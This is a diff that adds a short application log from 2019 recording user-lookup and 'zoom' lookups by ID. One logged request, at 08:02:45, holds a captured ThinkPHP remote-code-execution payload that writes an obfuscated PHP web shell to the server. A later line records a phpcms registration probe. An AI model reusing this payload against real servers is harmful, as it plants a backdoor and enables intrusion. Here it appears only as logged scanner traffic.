@@ -1,0 +1,22 @@
+2019-05-26 5:26:00 - INFO --> getUserByCookie: 
+2019-05-26 5:26:00 - INFO --> getZoomById: app
+2019-05-26 5:26:01 - INFO --> getUserByCookie: 
+2019-05-26 5:26:01 - INFO --> getZoomById: app
+2019-05-26 5:26:01 - INFO --> getUserByCookie: 
+2019-05-26 5:26:01 - INFO --> getZoomById: app
+2019-05-26 6:23:12 - INFO --> getUserByCookie: 
+2019-05-26 6:23:12 - INFO --> getZoomById: .well-known/assetlinks.json
+2019-05-26 8:02:45 - INFO --> getUserByCookie: 
+2019-05-26 8:02:45 - INFO --> getZoomById: s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=qozxbbmkyefbcc.php&vars[1][]=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST[qazw]);?%3E
+2019-05-26 9:35:55 - INFO --> getUserByCookie: 
+2019-05-26 9:35:55 - INFO --> getZoomById: app
+2019-05-26 14:14:59 - INFO --> getUserByCookie: 
+2019-05-26 14:14:59 - INFO --> getZoomById: M)v(f
+2019-05-26 14:14:59 - INFO --> incrementZoomById: M)v(f
+2019-05-26 14:14:59 - INFO --> increment zoom: M)v(f
+2019-05-26 18:07:37 - INFO --> getUserByCookie: 
+2019-05-26 18:07:37 - INFO --> getZoomById: M)v(f
+2019-05-26 18:07:37 - INFO --> incrementZoomById: M)v(f
+2019-05-26 18:07:37 - INFO --> increment zoom: M)v(f
+2019-05-26 21:07:32 - INFO --> getUserByCookie: 
+2019-05-26 21:07:32 - INFO --> getZoomById: m=member&c=index&a=register&siteid=1
